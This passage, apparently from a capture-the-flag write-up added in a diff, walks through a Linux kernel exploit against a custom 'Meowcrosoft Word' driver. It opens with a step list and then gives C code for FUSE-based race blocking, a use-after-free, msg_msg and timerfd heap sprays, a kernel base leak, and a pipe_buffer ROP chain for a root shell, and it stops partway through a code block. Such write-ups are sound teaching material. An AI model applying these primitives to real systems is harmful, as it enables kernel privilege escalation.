+<li>Write to the document where the buffer containing the data to be written is set to the mmapped address of FUSE file /write2. This will cause the main thread to block, and execution will be passed to write2_thread.</li>
+<li>Create a new thread &ldquo;write1_thread&rdquo;.</li>
+<li>Write to the document where the buffer containing the data to be written is set to the mmapped address of FUSE file /write1. This will cause write2_thread to block, and execution will be passed to write1_thread.</li>
+<li>Trigger the race condition by deleting the document (which will free the data section). At this point, there are pending writes to an object that has already been freed.</li>
+<li>While the write is still blocked, spray timerfd_ctx and arm the timers in order to leak a kernel address that can be used to calculate the kernel base.</li>
+<li>Free the timerfd_ctx objects.</li>
+<li>Spray msg_msg to cross cache and occupy the freed object.</li>
+<li>Unblock write1 to overwrite msg_msg size to a large value (0x960 in this case). At this point, write2 is still blocked.</li>
+<li>Read from the corrupted msg_msg object to leak a kmalloc-1024 address, as well as a next/prev pointer.</li>
+<li>Unblock write2 and overwrite next/prev so that the next/prev of 2 msg_msg objects of size 256 are pointing to the same secondary msg_msg of size 1024.</li>
+<li>Free the secondary msg_msg (that has 2 next pointers pointing to it) once.</li>
+<li>Spray sk_buf objects.</li>
+<li>Free the secondary msg_msg again to obtain a double free.</li>
+<li>Spray and free pipe_buf objects over the freed object of size 1024.</li>
+<li>Construct a fake pipe_buf object over the freed region and spray. The fake object will have release in pipe_buf_operations pointing to the start of the ROP chain.</li>
+<li>Release the pipe buffer objects by closing the pipes to trigger off the ROP chain.</li>
+<li>ROP it like it&rsquo;s hot to get your shell!</li>
+</ol>
+<h4 id="setup">Setup</h4>
+<p>We are first going to do some setup before our exploit.</p>
+<p>We want to limit all actions to the same CPU, so we will make a call to sched_setaffinity.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#66d9ef">cpu_set_t</span> cpu;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CPU_ZERO</span>(<span style="color:#f92672">&amp;</span>cpu);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CPU_SET</span>(<span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>cpu);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">sched_setaffinity</span>(<span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">cpu_set_t</span>), <span style="color:#f92672">&amp;</span>cpu)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;sched_setaffinity&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>We are then going to set up some pipes that would be used for blocking in the FUSE filesystem, as well as to synchronize different parts of our exploits so that the actions take place in the exact order that we want them to.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#75715e">// Setting up FUSE pipes to sync exploit
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Setting up pipes</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pipe</span>(fuse_pipe1);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pipe</span>(fuse_1_2_sync);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pipe</span>(fuse_pipe2);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pipe</span>(fuse_write2_data);
+</span></span></code></pre></div><p>Then, we are going to start the FUSE filesystem. Note that when the FUSE filesystem is started, all of the contents in the FUSE files and such would be finalized in a sense. For example, when you read from a FUSE file, the contents that you get would be the contents of the file when the FUSE filesystem is initialized. However, there is a way to &ldquo;modify&rdquo; the contents of a FUSE file by reading and writing to pipes; I will talk about this later on.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#75715e">// Start the FUSE filesystem
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Starting FUSE filesystem</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">fork</span>()) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">dup2</span>(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">666</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fuse_main</span>(argc, argv, <span style="color:#f92672">&amp;</span>operations, NULL);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>);
+</span></span></code></pre></div><p>After starting the FUSE filesystem, we need to mmap the files &ldquo;/write1&rdquo; and &ldquo;/write2&rdquo; as we would need the addresses later on in the exploit.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#75715e">// Open and mmap write1 file on FUSE
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Opening FUSE file write1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> fuse_fd1; 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>((fuse_fd1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;/tmp/fuse_dir/write1&#34;</span>, O_RDWR)) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] Failed to open FUSE file&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// mmap the /write1 file
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    addr_write1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mmap</span>(NULL, <span style="color:#ae81ff">0x1000</span>, PROT_READ<span style="color:#f92672">|</span>PROT_WRITE, MAP_PRIVATE, fuse_fd1, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (addr_write1 <span style="color:#f92672">==</span> MAP_FAILED) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] mmap failed&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Open and mmap write2 file on FUSE
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Opening FUSE file write2</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> fuse_fd2; 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>((fuse_fd2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;/tmp/fuse_dir/write2&#34;</span>, O_RDWR)) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] Failed to open FUSE file&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// mmap the /write2 file
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    addr_write2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mmap</span>(NULL, <span style="color:#ae81ff">0x1000</span>, PROT_READ<span style="color:#f92672">|</span>PROT_WRITE, MAP_PRIVATE, fuse_fd2, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (addr_write2 <span style="color:#f92672">==</span> MAP_FAILED) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] mmap failed&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>We also need to set up sockets, pipe buffer structs, and msg_msg queues that would be used later on in the exploit.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#75715e">// Set up sockets
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Setting up sockets</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_SOCKETS; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">socketpair</span>(AF_UNIX, SOCK_STREAM, <span style="color:#ae81ff">0</span>, ss[i]) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] Socket pair&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Set up message queues
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Setting up msg queues</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_MSQIDS; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ((msqid[i] <span style="color:#f92672">=</span> <span style="color:#a6e22e">msgget</span>(IPC_PRIVATE, IPC_CREAT <span style="color:#f92672">|</span> <span style="color:#ae81ff">0666</span>)) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] msgget failed&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Set up pipebuf stuff
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">struct</span> pipe_buf_operations <span style="color:#f92672">*</span>ops;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> pipe_buffer <span style="color:#f92672">*</span>pbuf;
+</span></span></code></pre></div><p>Finally, we need to open the Meowcrosoft Word device.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#75715e">// Open Meowcrosoft word device
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Opening Meowcrosoft Word device</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ((fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;/dev/meowcrosoft_word&#34;</span>, O_RDONLY)) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] Failed to open miscdevice&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><h4 id="triggering-the-race-condition-and-blocking">Triggering the Race Condition and Blocking</h4>
+<p>Now comes the fun part. We are going to trigger the race condition, and then block twice &ndash; first on /write2, which will call write2_thread, which will then block on /write1, which will then call write1_thread.</p>
+<p>We first create the doc object by doing something like <code>create_doc(buf, 256);</code>. create_doc is just a helper function that I have created to handle all the IOCTL calls to make life easier. This will allocate and create a doc object. A data region of size 256 will also be allocated in kmalloc-256.</p>
+<p>Once that is done, we will create a new thread for the function write2_thread. We will then call a write on the address returned from mmapping the /write2 file, and cause a block.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#75715e">// Create thread for write2
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Creating thread for write2</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">pthread_t</span> thr;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> b <span style="color:#f92672">=</span> <span style="color:#a6e22e">pthread_create</span>(<span style="color:#f92672">&amp;</span>thr, NULL, write2_thread, NULL); 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(b <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;pthread_create&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">write_doc</span>(addr_write2, <span style="color:#ae81ff">0x18</span>); <span style="color:#75715e">// Trigger and block 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>);
+</span></span></code></pre></div><p>Now the question is: why does the main thread block when we call write using addr_write2 (/write2)? When write_doc is called, at this point, write_done is 0, hence that check passes. A doc object exists, so that check also passes. The number of bytes that we are trying to write is smaller than the size of the data region (which is stored in the document object), so that check also passes. Since that check has passed, the module will now call copy_from_user to copy whatever is inside the specified address from userspace (in this case addr_write2, which /write2 has been mmapped to) to some buffer in kernel space. Let&rsquo;s take a look at the FUSE file mappings to see what happens when a read on the /write2 is called.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">do_read</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>path, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buffer, <span style="color:#66d9ef">size_t</span> size, <span style="color:#66d9ef">off_t</span> offset, <span style="color:#66d9ef">struct</span> fuse_file_info <span style="color:#f92672">*</span>fi) {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">dprintf</span>(<span style="color:#ae81ff">666</span>, <span style="color:#e6db74">&#34;--&gt; Trying to read %s, %u, %u</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, path, offset, size);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> lolText[<span style="color:#ae81ff">0x200</span>];
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">uint64_t</span> write1[<span style="color:#ae81ff">0x100</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>selectedText <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> signal;
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strcmp</span>(path, <span style="color:#e6db74">&#34;/write1&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>	    <span style="color:#a6e22e">memset</span>(write1, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(write1));
+</span></span><span style="display:flex;"><span>	    write1[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4242424242424242</span>;
+</span></span><span style="display:flex;"><span>	    write1[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4242424242424242</span>;
+</span></span><span style="display:flex;"><span>	    write1[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4343434343434343</span>; 
+</span></span><span style="display:flex;"><span>	    write1[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x960</span>;
+</span></span><span style="display:flex;"><span>		selectedText <span style="color:#f92672">=</span> write1;
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">dprintf</span>(<span style="color:#ae81ff">666</span>, <span style="color:#e6db74">&#34;[+] Blocking FUSE read thread</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">read</span>(fuse_pipe1[<span style="color:#ae81ff">0</span>], <span style="color:#f92672">&amp;</span>signal, <span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">dprintf</span>(<span style="color:#ae81ff">666</span>, <span style="color:#e6db74">&#34;[+] Unblocked FUSE read thread</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    	}
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strcmp</span>(path, <span style="color:#e6db74">&#34;/write2&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        	<span style="color:#a6e22e">dprintf</span>(<span style="color:#ae81ff">666</span>, <span style="color:#e6db74">&#34;[+] Blocking FUSE read thread</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        	<span style="color:#a6e22e">memset</span>(lolText, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(lolText));
+</span></span><span style="display:flex;"><span>        	<span style="color:#a6e22e">read</span>(fuse_pipe2[<span style="color:#ae81ff">0</span>], <span style="color:#f92672">&amp;</span>signal, <span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        	<span style="color:#a6e22e">read</span>(fuse_write2_data[<span style="color:#ae81ff">0</span>], <span style="color:#f92672">&amp;</span>lolText, <span style="color:#ae81ff">0x18</span>);
+</span></span><span style="display:flex;"><span>        	selectedText <span style="color:#f92672">=</span> lolText;
+</span></span><span style="display:flex;"><span>        	<span style="color:#a6e22e">dprintf</span>(<span style="color:#ae81ff">666</span>, <span style="color:#e6db74">&#34;[*] From FUSE: %llx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, ((<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>) selectedText)[<span style="color:#ae81ff">0</span>]);
+</span></span><span style="display:flex;"><span>        	<span style="color:#a6e22e">dprintf</span>(<span style="color:#ae81ff">666</span>, <span style="color:#e6db74">&#34;[*] From FUSE: %llx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, ((<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>) selectedText)[<span style="color:#ae81ff">1</span>]);
+</span></span><span style="display:flex;"><span>        	<span style="color:#a6e22e">dprintf</span>(<span style="color:#ae81ff">666</span>, <span style="color:#e6db74">&#34;[*] From FUSE: %llx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, ((<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>) selectedText)[<span style="color:#ae81ff">2</span>]);
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">dprintf</span>(<span style="color:#ae81ff">666</span>, <span style="color:#e6db74">&#34;[+] Unblocked FUSE read thread</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    	}
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    	}
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">memcpy</span>(buffer, selectedText <span style="color:#f92672">+</span> offset, size);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0x100</span> <span style="color:#f92672">-</span> offset;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>When a read from the FUSE file /write2 occurs, <code>read(fuse_pipe2[0], &amp;signal, 1);</code> is triggered. However, remember we have just created the pipes when we set up the exploit; there is nothing that can be read from the pipe. As there is currently nothing to read from the pipe, the main thread would block on read as it will try to read from the pipe until it successfully reads something. This will cause context switching to the newly created thread running the function write2_thread.</p>
+<p>Inside write2_thread, we do the same block on write again, but this time, we block on read from /write1. We call write but use the address that has been mmapped to the FUSE file /write1.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#75715e">// Create thread for write1
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Creating thread for write1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">pthread_t</span> thr;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> b <span style="color:#f92672">=</span> <span style="color:#a6e22e">pthread_create</span>(<span style="color:#f92672">&amp;</span>thr, NULL, write1_thread, NULL); 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(b <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;pthread_create&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">write_doc</span>(addr_write1, <span style="color:#ae81ff">0x20</span>); <span style="color:#75715e">// Trigger and block 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>);
+</span></span></code></pre></div><p>Similarly as before and as seen in the code for FUSE above, when we try to read from /write1, <code>read(fuse_pipe1[0], &amp;signal, 1);</code> is called, causing write2_thread to block and the CPU would execute write1_thread instead.</p>
+<h4 id="leaking-kernel-base">Leaking Kernel Base</h4>
+<p>To leak the kernel base, we can spray the timerfd_ctx object. Struct timerfd_ctx and other relevant structs are shown below:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> timerfd_ctx {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">union</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">struct</span> hrtimer tmr;
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">struct</span> alarm alarm;
+</span></span><span style="display:flex;"><span>	} t;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">ktime_t</span> tintv;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">ktime_t</span> moffs;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">wait_queue_head_t</span> wqh;
+</span></span><span style="display:flex;"><span>	u64 ticks;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> clockid;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">short</span> <span style="color:#66d9ef">unsigned</span> expired;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">short</span> <span style="color:#66d9ef">unsigned</span> settime_flags;	
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> rcu_head rcu;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> list_head clist;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">spinlock_t</span> cancel_lock;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">bool</span> might_cancel;
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> hrtimer {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> timerqueue_node		node;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">ktime_t</span>				_softexpires;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">enum</span> <span style="color:#a6e22e">hrtimer_restart</span>		(<span style="color:#f92672">*</span>function)(<span style="color:#66d9ef">struct</span> hrtimer <span style="color:#f92672">*</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> hrtimer_clock_base	<span style="color:#f92672">*</span>base;
+</span></span><span style="display:flex;"><span>	u8				state;
+</span></span><span style="display:flex;"><span>	u8				is_rel;
+</span></span><span style="display:flex;"><span>	u8				is_soft;
+</span></span><span style="display:flex;"><span>	u8				is_hard;
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> timerqueue_node {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> rb_node node;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">ktime_t</span> expires;
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> rb_node {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>  __rb_parent_color;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> rb_node <span style="color:#f92672">*</span>rb_right;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> rb_node <span style="color:#f92672">*</span>rb_left;
+</span></span><span style="display:flex;"><span>} <span style="color:#a6e22e">__attribute__</span>((<span style="color:#a6e22e">aligned</span>(<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">long</span>))));
+</span></span></code></pre></div><p>From all the structs, we can see that enum hrtimer_restart starts at index 0x28 in struct timerfd_ctx, and is a function pointer. If we arm the timers, hrtimer_restart will be populated with a kernel pointer, which we can leak and use to calculate kernel base.</p>
+<p>To spray and arm the timers, we can do the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#75715e">// Spray timerfd objects
